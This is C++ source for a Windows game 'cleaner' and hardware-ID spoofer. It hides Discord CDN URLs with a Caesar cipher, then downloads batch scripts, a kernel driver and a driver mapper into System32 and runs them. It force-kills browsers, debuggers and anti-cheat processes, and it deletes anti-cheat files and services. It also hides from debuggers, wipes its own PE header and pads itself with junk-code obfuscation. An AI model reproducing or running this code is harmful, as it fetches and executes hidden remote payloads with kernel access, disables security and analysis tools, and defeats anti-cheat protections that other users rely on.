#include <iostream>
#include "Headers/dead.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "Headers/junk-code.h"
#include <WinInet.h>
#include <vector>
#include <tchar.h>
#include "Headers/color.hpp"
#include <TlHelp32.h>
#include <cstdio>
#include "Headers/lazy_importer.hpp"
#include <conio.h>


#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}
using namespace junkcode;

#define SHOW_DEBUG_MESSAGES

string encrypt(string input) {
    vector<char> word(input.begin(), input.end());
    string alphabet = "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < (int)input.length(); i++) {
        for (int j = 0; j < (int)alphabet.length(); j++) {
            if (word[i] == alphabet[j]) {
                word[i] = alphabet[(j + 3) % 26];

                break;
            }
        }
    }
    string str(word.begin(), word.end());
    return str;
}
string decrypt(string input) {
    vector<char> word(input.begin(), input.end());
    string alphabet = "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < (int)input.length(); i++) {
        for (int j = 0; j < (int)alphabet.length(); j++) {
            if (word[i] == alphabet[j]) {
                word[i] = alphabet[(j - 3) % 26];
                break;
            }
        }
    }
    string str(word.begin(), word.end());
    return str;
}
VOID ErasePEHeaderFromMemory()
{
    DWORD OldProtect = 0;

    char* pBaseAddr = (char*)GetModuleHandle(NULL);

    VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &OldProtect);

    SecureZeroMemory(pBaseAddr, 4096);
}


bool IsProcessRunning(const wchar_t* processName)
{



    bool exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry))
            if (!_wcsicmp(entry.szExeFile, processName))
                exists = true;

    CloseHandle(snapshot);
    return exists;
}





#pragma auto_inline(on)
DWORD g_origCrc = 0x2bd0;
void trampoline(void (*fnptr)(), bool ping = false)
{
    if (ping)
        fnptr();
    else
        trampoline(fnptr, true);
}
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib") 
using namespace junkcode;

void startup();


void SizeOfImage()
{
    // Any unreasonably large value will work say for example 0x100000 or 100,000h
    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}



void apex()
{
    std::string apex = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114575800954941/dsha.edw");
    std::string apexpath = (dead("C:\\Windows\\System32\\1028\\Apex.bat").c_str());
    URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\1028\\").c_str());
    system(dead("Start C:\\Windows\\System32\\1028\\Apex.bat").c_str());


}
void gta()
{
    std::string gta = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114574483918858/jwd.edw");
    std::string gtapath = (dead("C:\\Windows\\System32\\gta.bat").c_str());
    URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\").c_str());
    system(dead("Start C:\\Windows\\System32\\gta.bat").c_str());

}
void fortnite()
{
    std::string fortnite = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114573007527946/Fruwqlwh.edw");
    std::string fortnitepath = (dead("C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
    URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\1040\\").c_str());
    system(dead("Start C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
}
void fishingplanet()
{
    std::string fishingplanet = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114571648593931/ilvklqj-sodqhw.edw");
    std::string fishingplanetpath = (dead("C:\\Windows\\System32\\2052\\Fishing-planet.bat").c_str());
    URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\2052\\").c_str());
    system(dead("Start C:\\Windows\\System32\\2052\\Fishing-planet.bat").c_str());

}
void cod()
{
    std::string cod = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114570369318962/Crog-Wduh.edw");
    std::string codpath = (dead("C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());
    URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\3082\\").c_str());
    system(dead("Start C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());


}


void cleaner() {
    system(dead("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM chrome.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM msedge.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM discord.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM firefox.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM brave.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM opera.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM vmnat.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM Spotify.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM wcg.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM BEServices.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM BattleEye.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM epicgameslauncher.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM r5apex.exe 2>NULL").c_str());
    system(dead("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
    system(dead("del /F /IM del /f %temp%\* 2>NULL").c_str());
    system(dead("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
    system(dead("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
    system(dead("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
    system(dead("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
    system(dead("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
    system(dead("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
    system(dead("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM LockApp.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM vmware.exe 2>NULL").c_str());
    system(dead("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(dead("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im procmon.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im idaq.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im helper.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im die.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im client.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im BEService.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im Client.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
    system(dead("sc stop BEService >nul 2>&1").c_str());
    system(dead("sc delete BEService >nul 2>&1").c_str());
    system(dead("sc stop BEDaisy >nul 2>&1").c_str());
    system(dead("sc delete BEDaisy >nul 2>&1").c_str());
    system(dead("sc stop EasyAntiCheat >nul 2>&1").c_str());
    system(dead("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
    system(dead("sc delete EasyAntiCheat >nul 2>&1").c_str());
    system(dead("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
    system(dead("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im csgo.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(dead("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(dead("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(dead("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
    system(dead("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());

}
void deleter()
{
    //delete the files we downloaded
    system(dead("cd C:\\Windows\\SysWOW64\\").c_str());

    system(dead("del audio-for-stability.exe").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\de-DE\\").c_str());

    system(dead("del C:\\Windows\\System32\\de-DE\\woof.sys").c_str());

    system(dead("cls").c_str());

    system(dead("del C:\\Windows\\System32\\de-DE\\mapper.exe").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\3082\\").c_str());

    system(dead("del C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\2050\\").c_str());

    system(dead("del C:\\Windows\\System32\\2052\\Fishing-Planet.bat").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\1028\\").c_str());

    system(dead("del C:\\Windows\\System32\\1028\\Apex.bat").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\").c_str());

    system(dead("del C:\\Windows\\System32\\gta.bat").c_str());

    system(dead("cls").c_str());

    system(dead("cd C:\\Windows\\System32\\1040\\").c_str());

    system(dead("del C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());

    system(dead("cls").c_str());
    system(dead("cls").c_str());


}

void safeshutdown()
{
    system(dead("cls").c_str());

    string a;
    std::cout << RED << (dead("\nunloading kernel modules").c_str());
    Sleep(3500);
    std::cout << MAGENTA << (dead("\nunloading resources").c_str());
    Sleep(1450);
    std::cout << CYAN << (dead("\nunloading from memory").c_str());
    Sleep(2400);
    system(dead("cls").c_str());
    std::cout << (dead("Do you want to restart your pc? \nYes/No : ").c_str());
    cin >> a;
    if (a == "Yes" || a == "yes")
    {
        system(dead("shutdown -r").c_str());
        exit(0);
    }

    else
    {
        exit(0);
        return exit(0);
    }


}
void driverdetect()
{
    const TCHAR* devices[] = {
_T("\\\\.\\Dumper"),
_T("\\\\.\\KsDumper")
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        TCHAR msg[256] = _T("");
        if (hFile != INVALID_HANDLE_VALUE) {
            system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
            SetLastError(1);
            exit(0);
        }
        else
        {

        }
    }
}

void spoofer()
{
    string spoofer = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/881227464498630677/NhzWrri.vbv");
    string spooferpath = (dead("C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);

    string mapper = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/879745681294786600/ngpdsshu.hah");
    string mapperpath = (dead("C:\\Windows\\System32\\de-DE\\mapper.exe").c_str());
    URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
    system(dead("cd C:\\Windows\\System32\\de-DE\\").c_str());
    system(dead("C:\\Windows\\System32\\de-DE\\mapper.exe C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
    Sleep(2000);
    deleter();
    Sleep(2000);
    system(dead("NETSH WINSOCK RESET").c_str());
    system(dead("NETSH INT IP RESET").c_str());
    system(dead("NETSH INTERFACE IPV4 RESET").c_str());
    system(dead("NETSH INTERFACE IPV6 RESET").c_str());
    system(dead("NETSH INTERFACE TCP RESET").c_str());
    system(dead("IPCONFIG /RELEASE").c_str());
    system(dead("IPCONFIG /RELEASE").c_str());
    system(dead("IPCONFIG /RENEW").c_str());
    system(dead("IPCONFIG /FLUSHDNS").c_str());
    system(dead("IPCONFIG /RENEW").c_str());
    system(dead("cls").c_str());
    safeshutdown();
}

void setcolor(unsigned short color)
{
    rydekem();
    lnttirs();
    tlmisir();
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }

    return subject;
}



vector<string> serial;

void loadserial()
{
    serial.push_back(dead("384604182").c_str());
    serial.push_back(dead("2953439145").c_str());

}
auto RandomTitle = [](int iterations) {
    std::string Title;
    for (int i = 0; i < iterations; i++)
        Title += rand() % 255 + 1;
    return Title;
};
void mainbot()
{





    TCHAR volumeName[MAX_PATH + 1] = { 0 };
    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;




    __asm
    {
        jmp short Label1
        _emit 0xA5
        _emit 0xB9
        _emit 0x28
        _emit 0x24
        _emit 0xFF
        Label2:
        jmp short Label3
            _emit 0x99
            _emit 0xED
            _emit 0x9D
            _emit 0xB5
            _emit 0x9A
            Label1:
        jmp short Label2
            _emit 0xDF
            _emit 0xE0
            _emit 0xDD
            _emit 0x4C
            _emit 0xDE
            Label3:
        jmp short Label4
            _emit 0xD7
            _emit 0x73
            _emit 0xA2
            _emit 0x31
            _emit 0x80
            Label4:
        jmp short Label5
            _emit 0xD6
            _emit 0xC6
            _emit 0x6F
            _emit 0x3E
            _emit 0xA9
            Label5:
    }
    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
    while (true)
    {
        if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
        {

            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));

            SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
            setcolor(9);
            std::cout << (dead(" _| |___ _____ ___ ___   ------------------ \n").c_str());
            std::cout << (dead("| . | -_|     | . |   |  | demoncleaner.gq| \n").c_str());
            std::cout << (dead("|___|___|_|_|_|___|_|_|  ------------------  \n").c_str());

            Sleep(2000);
            std::cout << RED << (dead("\n\nstarting connection...\n").c_str());
            Sleep(2000);
            std::cout << RED << (dead("\n\nloading resources...\n").c_str());
            Sleep(1000);
            std::cout << RED << (dead("\n\nloading in sockets...").c_str());
            Sleep(2400);
            system(dead("cls").c_str());

            cleaner();
            fishingplanet();
            gta();
            apex();
            cod();
            fortnite();
            spoofer();


        }

        else
        {



            system(dead("cls").c_str());
            std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
            std::cout << GREEN << (dead("Hwid : ").c_str());;
            std::cout << serialNumber << std::endl;
            Sleep(10000);
            JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                exit(0);

        }

    }


}


typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ ULONG  ThreadInformationClass,
    _In_ PVOID  ThreadInformation,
    _In_ ULONG  ThreadInformationLength
    );
const ULONG ThreadHideFromDebugger = 0x11;

string build_date()
{
    return __DATE__;
}

string build_time()
{
    return __TIME__;
}
void otherthing()
{
    DWORD OldProtect = 0;

    // Get base address of module
    char* pBaseAddr = (char*)GetModuleHandle(NULL);

    // Change memory protection
    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
        PAGE_READWRITE, &OldProtect);

    // Erase the header
    ZeroMemory(pBaseAddr, 4096);

    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}
void HideFromDebugger()
{

    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
        GetProcAddress(hNtDll, "NtSetInformationThread");
    NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
        ThreadHideFromDebugger, NULL, 0);
}
inline bool HideThread(HANDLE hThread)
{
    typedef NTSTATUS(NTAPI* pNtSetInformationThread)
        (HANDLE, UINT, PVOID, ULONG);
    NTSTATUS Status;

    // Get NtSetInformationThread
    pNtSetInformationThread NtSIT = (pNtSetInformationThread)
        GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")),
            "NtSetInformationThread");

    // Shouldn't fail
    if (NtSIT == NULL)
        return false;

    // Set the thread info
    if (hThread == NULL)
        Status = NtSIT(GetCurrentThread(),
            0x11, // HideThreadFromDebugger
            0, 0);
    else
        Status = NtSIT(hThread, 0x11, 0, 0);

    if (Status != 0x00000000)
        return false;
    else
        return true;
}
void startup();
int _start()
{
    HideThread;
    startup();
    trampoline;
    return 0;
}

void startup()
{
    ErasePEHeaderFromMemory();

    while (true)
    {

        mainbot();
    }

}

int main()
{
    HideFromDebugger();
    driverdetect();
    build_date();
    build_time();
    loadserial();
    startup();
}

